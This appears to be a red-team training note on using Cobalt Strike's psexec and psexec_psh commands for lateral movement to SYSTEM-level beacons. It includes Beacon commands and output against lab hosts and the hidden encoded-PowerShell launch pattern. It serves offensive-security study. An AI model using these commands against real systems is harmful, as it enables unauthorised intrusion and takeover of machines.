
PsExec is a Windows telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software.


## 🖊️ via Cobalt Strike

The `psexec` / `psexec64` commands work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary.  Beacons executed this way run as SYSTEM.

For example:

```
beacon> jump psexec64 web.dev.cyberbotic.io smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web via Service Control Manager (\\web\ADMIN$\768870c.exe)

Started service 768870c on web.dev.cyberbotic.io
[+] established link to child beacon: 10.10.122.30
```

![[psexec.png]]


#### psexec_psh

Another variation to this is `psexec_psh`, this one doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).  The pattern it uses by default is `%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ...`.

Example:

```
beacon> jump psexec_psh web smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web via Service Control Manager (PSH)

Started service bd119dd on web
[+] established link to child beacon: 10.10.122.30
```




### ⚠ Opsec




### Properties
---
📆 created   {{14-02-2024}} 13:44
🏷️ tags: #redteam #crto #Windows 

---

